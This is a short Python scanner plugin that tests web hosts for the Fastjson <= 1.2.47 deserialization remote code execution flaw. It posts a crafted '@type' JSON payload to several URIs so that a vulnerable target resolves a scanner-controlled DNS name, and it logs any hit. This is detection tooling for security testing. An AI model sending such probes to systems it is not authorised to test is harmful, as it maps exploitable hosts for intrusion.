import requests
from celery_app.utils.utils import insert_vuln_db
from celery_app.utils.utils import get_dns_payload,have_record

#Fastjson =< 1.2.47 反序列化远程代码执行漏洞
plugin_id=44
default_port_list=[80,443,8080,9200]

def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)

    subdomain,payload_dns=get_dns_payload()


    uris = ['/', '/api', '/api/login', '/api/log', '/log']
    payload = {"@type": "java.net.InetAddress", "val": payload_dns}
    try:
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            targets = ['{}{}'.format(target, uri) for uri in uris]
            for url in targets:
                session.post(url, json=payload, timeout=30, verify=False)

            if have_record(subdomain):
                insert_vuln_db(host, target,payload_dns , plugin_id)

    except:
        return False

